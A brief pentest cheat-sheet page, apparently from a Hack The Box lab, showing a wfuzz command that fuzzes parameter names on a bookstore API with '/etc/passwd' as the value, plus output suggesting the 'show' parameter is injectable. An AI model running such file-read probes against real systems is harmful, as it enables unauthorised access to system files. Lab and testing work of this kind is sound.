---
title: API fuzzing 🚀
---
## Using wfuzz

```shell
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://DOMAIN/api/v1/resources/books?FUZZ=/etc/passwd"

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bookstore.htb:5000/api/v1/resources/books?FUZZ=/etc/passwd
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000517:   200        1 L      1 W        3 Ch        "author"                                           
000001964:   200        1 L      1 W        3 Ch        "id"                                               
000003215:   200        1 L      1 W        3 Ch        "published"                                        
000003645:   200        30 L     38 W       1555 Ch     "show"                                             

Total time: 0
Processed Requests: 4614
Filtered Requests: 4610
Requests/sec.: 0
```

> In this case, the show parameter seems to be injectable

